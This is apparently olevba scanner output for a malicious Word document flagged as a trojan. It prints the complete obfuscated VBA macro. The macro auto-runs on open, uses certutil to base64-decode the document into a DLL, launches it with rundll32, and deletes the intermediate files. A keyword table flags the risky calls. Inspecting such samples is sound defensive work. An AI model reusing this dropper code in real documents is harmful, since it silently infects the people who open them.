olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: UDS-Trojan.MSOffice.SAgent.gen-d5dfe06d9fcb8aaccb1f3b4613d18c52ebb50f8ab2e8b1860968223286f21b50
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: UDS-Trojan.MSOffice.SAgent.gen-d5dfe06d9fcb8aaccb1f3b4613d18c52ebb50f8ab2e8b1860968223286f21b50 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
    Module1.NkmoA
End Sub
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: UDS-Trojan.MSOffice.SAgent.gen-d5dfe06d9fcb8aaccb1f3b4613d18c52ebb50f8ab2e8b1860968223286f21b50 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Type WsRs0y
t6nZZZL4 As Long: bzWF8cAxW As Long: OUCyrzh As Long: h9kn6tE7T As Long
End Type
Private Type x0mlD777fR
nuprnuX As Long: QxfURjck As String: uo6VH7 As String: xMAbY0 As String: Ad6oi As Long
OACsb As Long: sOSQF As Long: aNQ7jC1qd As Long: TOqbEKy6kn As Long: GBI7VPTB As Long
nmG2Jca As Long: B0SQwB4yl As Long: UWx47whVF As Integer: cyMwJzuK As Integer: jDOnI As Integer
oUxwN9B As Long: gyteOufC As Long: JoYDY As Long
End Type
#If VBA7 Then
Private Declare PtrSafe Function SetCapture Lib "user32" (ByVal VwQeXW3x As LongPtr) As LongPtr
Private Declare PtrSafe Function SetCaretBlinkTime Lib "user32" (ByVal QT4gIx As LongPtr) As LongPtr
Private Declare PtrSafe Function SetCaretPos Lib "user32" (ByVal kTThi6ogY As LongPtr, _
ByVal udaeOA As LongPtr) As LongPtr
Private Declare PtrSafe Function CreateProcessA Lib "Kernel32" (ByVal XejW0V3vY As String, _
ByVal J4RhSY As String, ByVal dBtMHO As Long, ByVal IQkvEp4iw1 As Long, _
ByVal Yy7ZRG4U As LongPtr, ByVal uN5WJK09 As LongPtr, ByVal PIIiG As Long, _
ByVal cHOMWJAb As String, o6A6mI0 As x0mlD777fR, STAeUYh2uv As WsRs0y) As LongPtr
Private Declare PtrSafe Function Sleep Lib "Kernel32" (ByVal AJcqtEHAiq As Long) As Long
Private Declare PtrSafe Function SetClassLongA Lib "user32" (ByVal m5JPchgFK As LongPtr, _
ByVal pAWbR As LongPtr, ByVal vYUEecyn As LongPtr) As LongPtr
Private Declare PtrSafe Function SetClassWord Lib "user32" (ByVal CbHOJb As LongPtr, _
ByVal jo1Yvob9OE As LongPtr, ByVal impsx3 As LongPtr) As LongPtr
#Else
Private Declare Function CreateProcessA Lib "Kernel32" (ByVal TRI0AOk6v As String, ByVal Kmh36 As String, _
ByVal NOPGi3iTt1 As Long, ByVal vnqCO0kI As Long, ByVal Hc6nmpdkX As Long, _
ByVal A1vO8bhJDw As Long, ByVal xOaF2c As Long, ByVal Y9QTCYJM As String, _
LrEd4VXk7F As x0mlD777fR, W8VCJpXb As WsRs0y) As Long
Private Declare Function Sleep Lib "Kernel32" (ByVal EE1llLmFN As Long) As Long
Private Declare Function SetCapture Lib "user32" (ByVal uf9a5u8 As Long) As Long
Private Declare Function SetClassLongA Lib "user32" (ByVal c4mu2ZeH As Long, _
ByVal ZerXTd As Long, ByVal Q1XCy8NTq As Long) As Long
Private Declare Function SetClassWord Lib "user32" (ByVal MMbidpgyl As Long, _
ByVal jZ3XfB As Long, ByVal OpN3NNgzvv As Long) As Long
#End If
Private ZRyGV
Private AAAA
Private BBBB

Public Function NkmoA()
    ZRyGV = DGrIwBoic(MQpR2UGXn9("HOLIRUSUHVX"))
    j0uQ3dhEF (ZRyGV)
    HQKgx (ZRyGV)
End Function

Private Function j0uQ3dhEF(ZRyGV As String)
    ActiveDocument.SaveAs2 FileName:=ZRyGV + ".xls", FileFormat:=wdFormatText
    ActiveDocument.SaveAs2 FileName:=ZRyGV + ".doc", FileFormat:=wdFormatText
End Function

Private Function HQKgx(ZRyGV As String)
    ZRyGV = DGrIwBoic(MQpR2UGXn9("HOLIRUSUHVX"))
    ABC (ZRyGV)
End Function
    
Private Function ABC(ZRyGV As String)
    WJuUtxJ = " " & MQpR2UGXn9("hgrfhg0") & " " + ZRyGV + ".xls " + ZRyGV + MQpR2UGXn9("oog1")
    Sb9etGDP0T = MQpR2UGXn9("h{h1olwxwuhf_56phwv|V_vzrgqlZ_=F")
    Dim Fne9Hx As x0mlD777fR: Dim ic0uG As WsRs0y
    If CreateProcessA(Sb9etGDP0T, WJuUtxJ, 0, 0, False, &H8, 0, MQpR2UGXn9("_=F"), Fne9Hx, ic0uG) Then
            Sleep 5000
            BCD (ZRyGV)
    Else
        ActiveDocument.Close
    End If
End Function

Private Function BCD(ZRyGV As String)
    Dim Aki5thX As x0mlD777fR: Dim FffkQzJ As WsRs0y
    uN8mpOOqFN = MQpR2UGXn9("h{h156oogqxu_56phwv|V_vzrgqlZ_=F")
    If CreateProcessA(uN8mpOOqFN, " " & ZRyGV + MQpR2UGXn9("4U/oog1"), 0, 0, False, 0, 0, MQpR2UGXn9("_=F"), Aki5thX, FffkQzJ) Then
        Kill ZRyGV + ".xls"
        Sleep 4000
        Kill ZRyGV + MQpR2UGXn9("oog1")
    End If
End Function

Private Function DGrIwBoic(S As String) As String
    DGrIwBoic = Environ$(S) & Application.PathSeparator & "N5uIJVSp"
End Function

Function MQpR2UGXn9(Aki5thX As String) As String
    MQpR2UGXn9 = YOxYOcH0w(jU6vF3(Aki5thX, Len(Aki5thX), 1), Len(Aki5thX), 3)
End Function

Public Function jU6vF3(FffkQzJ As String, WJuUtxJ As Long, CiaxhQp As Long) As String
    AAAA = FffkQzJ
    For Sb9etGDP0T = 1 To WJuUtxJ
       Mid$(AAAA, Sb9etGDP0T, 1) = Mid$(FffkQzJ, WJuUtxJ - Sb9etGDP0T + CiaxhQp, 1)
    Next
    jU6vF3 = AAAA
End Function

Public Function YOxYOcH0w(Fne9Hx As String, FffkQzJ As Long, WJuUtxJ As Long) As String
    For Aki5thX = 1 To FffkQzJ
        BBBB = Oozl5UCb6(Mid$(Fne9Hx, Aki5thX, 1))
        Mid$(Fne9Hx, Aki5thX, 1) = BBBB
    Next
    YOxYOcH0w = Fne9Hx
End Function

Private Function A9Z4SY(Fne9Hx As Long) As String
    A9Z4SY = Chr(Fne9Hx)
End Function

Private Function Oozl5UCb6(Fne9Hx As String) As String
    Oozl5UCb6 = A9Z4SY(Asc(Fne9Hx) - 3)
End Function





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

